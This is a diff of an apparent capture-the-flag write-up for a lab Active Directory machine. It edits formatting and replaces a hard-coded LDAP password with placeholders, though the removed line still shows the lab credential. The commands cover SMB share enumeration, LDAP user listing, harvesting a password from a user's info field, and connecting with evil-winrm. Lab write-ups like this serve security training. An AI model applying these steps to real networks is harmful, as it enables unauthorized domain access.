@@ -99,7 +99,6 @@ text: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this opera
 
 Enumerate shares permissions as non-existent user.
 
-{% code overflow="wrap" %}
 ```shell
 smbmap -H 10.10.11.174 -u 'root'
 [+] Guest session   	IP: 10.10.11.174:445	Name: 10.10.11.174                                      
@@ -112,7 +111,6 @@ smbmap -H 10.10.11.174 -u 'root'
  support-tools                   READ ONLY	support staff tools
  SYSVOL                          NO ACCESS	Logon server share
 ```
-{% endcode %}
 
 Enumerate readable shares "support-tools".
 
@@ -248,16 +246,14 @@ public class Example {
 
 To list out all users in the domain:
 
-{% code overflow="wrap" %}
 ```shell
 ldapsearch -H ldap://10.10.11.174 -D '[DOMAIN]\[USER]' -w '[PASSWORD]' -b "DC=support,DC=htb" '(objectClass=Person)'
 ```
-{% endcode %}
 
 Lets look at support user's detail first. Why support? Because of the machine name and support folder in SMB.
 
 ```shell
-ldapsearch -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" '(objectClass=Person)' | grep 'sAMAccountName: support' -B36
+ldapsearch -H ldap://10.10.11.174 -D '[DOMAIN]\[USER]' -w '[PASSWORD]' -b "DC=support,DC=htb" '(objectClass=Person)' | grep 'sAMAccountName: support' -B36
 # support, Users, support.htb
 dn: CN=support,CN=Users,DC=support,DC=htb
 objectClass: top
@@ -298,10 +294,5 @@ sAMAccountName: support
 ```
 
 Info field looks like a password. Using it to rerun the ldap query works. RDP is not open, therefore [evil-winrm](https://github.com/Hackplayers/evil-winrm) was used to connect to the machine.
-
-
-
-
-
 
 
